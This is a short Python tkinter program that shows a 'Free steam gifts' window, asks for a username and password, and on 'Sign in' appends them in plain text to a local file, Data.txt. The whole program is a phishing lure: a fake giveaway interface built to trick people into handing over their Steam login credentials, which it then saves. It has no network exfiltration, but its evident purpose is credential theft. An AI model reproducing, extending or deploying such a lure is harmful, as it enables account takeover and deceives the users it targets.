import tkinter as tk
from random import randint, choice
from tkinter import messagebox
def AddIdea():
    value1 = EnterText1.get()
    value2 = EnterText2.get()
    if value1 != '' and value2 != '':
        with open("Data.txt", 'a+', encoding="utf-8") as file:
            file.write(f"Username: {value1}, Password: {value2}\n")
            EnterText1.delete(0, 'end')
            EnterText2.delete(0, 'end')
    else:
        tk.messagebox.showinfo("Error", "The input field is empty")


window = tk.Tk()
window.resizable(width=False, height=False)
window.title("Free steam gifts")
window.geometry('720x360')
window["bg"] = "#203255"

data = tk.Label(window, text="Enter your data", font=("Arial Bold", 20), fg="White", bg="#203255")
data.place(x=260, y=25)

name = tk.Label(window, text="Username", font=("Arial Bold", 8), fg="White", bg="#203255")
name.place(x=145, y=75)

password = tk.Label(window, text="Password", font=("Arial Bold", 8), fg="White", bg="#203255")
password.place(x=145, y=115)

EnterText1 = tk.Entry(fg="Black", width=47)
EnterText1.place(x=220, y=75)

EnterText2 = tk.Entry(fg="Black", width=47)
EnterText2.place(x=220, y=115)

button1 = tk.Button(window, text="Sign in", width='20', command=AddIdea, font=("Arial Bold", 9), height='2', bg="#203255", fg='White')
button1.place(x = 280, y=150)



window.mainloop()





